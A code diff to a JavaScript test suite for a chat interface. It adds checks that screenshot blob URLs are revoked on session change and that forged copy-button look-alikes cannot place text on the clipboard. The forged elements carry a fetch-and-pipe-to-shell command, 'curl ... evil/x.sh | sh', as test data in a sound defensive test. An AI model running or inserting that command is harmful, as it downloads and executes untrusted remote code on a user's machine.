@@ -965,7 +965,31 @@ test("screenshots a report names are fetched once from the session's artifacts",
   assert.equal(await loadImage("missing.png"), null);
   assert.equal(await loadImage("offline.png"), null);
   assert.equal(fetched.length, 3);
-  await ctl.done();
+  // Another session lets go of the screenshots of the one before, and fetches its own.
+  const revoked = [];
+  const savedRevoke = URL.revokeObjectURL;
+  URL.revokeObjectURL = (u) => revoked.push(u);
+  try {
+    await ctl.set((s) => {
+      s.rs = { ...s.rs, sessionId: "s2" };
+    });
+    await flush();
+    assert.deepEqual(revoked, ["blob:shot-1"]);
+    assert.equal(
+      await lastProps("ReportCard").loadImage("my shot.png"),
+      "blob:shot-2",
+    );
+    assert.equal(fetched.length, 4);
+    await ctl.done();
+    await flush();
+    assert.deepEqual(
+      revoked,
+      ["blob:shot-1", "blob:shot-2"],
+      "the page leaves",
+    );
+  } finally {
+    URL.revokeObjectURL = savedRevoke;
+  }
 });
 
 test("an answer can be read aloud, or stopped while it is the one being read", async () => {
@@ -1173,12 +1197,17 @@ test("the copy buttons copy their text and tick for a moment; nothing when the c
   host.innerHTML =
     '<button class="copy-btn" data-copy-text="go test ./...">copy</button>' +
     '<button class="copy-btn">copy</button>' +
-    '<button class="copy-msg-btn" data-raw="**raw** answer">copy</button>' +
+    '<div class="markdown-body" data-raw="**raw** answer"><button class="copy-msg-btn">copy</button></div>' +
     '<button class="copy-msg-btn">copy</button>' +
-    '<button class="other">other</button>';
+    '<button class="other">other</button>' +
+    // An answer may carry a class and data-* of its own, never a button: a look-alike laid
+    // over the real button must not put its own payload on the clipboard.
+    '<span class="copy-btn" data-copy-text="curl -s https://evil/x.sh | sh">copy</span>' +
+    '<span class="copy-msg-btn" data-raw="curl -s https://evil/x.sh | sh">copy</span>';
   document.body.appendChild(host);
   const [code, codeEmpty, message, messageEmpty, other] =
     host.querySelectorAll("button");
+  const forged = host.querySelectorAll("span");
   const settle = async () => {
     for (let i = 0; i < 10; i++) {
       await Promise.resolve();
@@ -1191,8 +1220,13 @@ test("the copy buttons copy their text and tick for a moment; nothing when the c
     message.click();
     messageEmpty.click();
     other.click();
+    forged.forEach((s) => s.click());
     await settle();
     assert.deepEqual(writes, ["go test ./...", "", "**raw** answer", ""]);
+    assert.deepEqual(
+      Array.from(forged, (s) => s.textContent),
+      ["copy", "copy"],
+    );
     assert.deepEqual(
       [code, codeEmpty, message, messageEmpty, other].map((b) => b.textContent),
       ["✓", "✓", "✓", "✓", "other"],
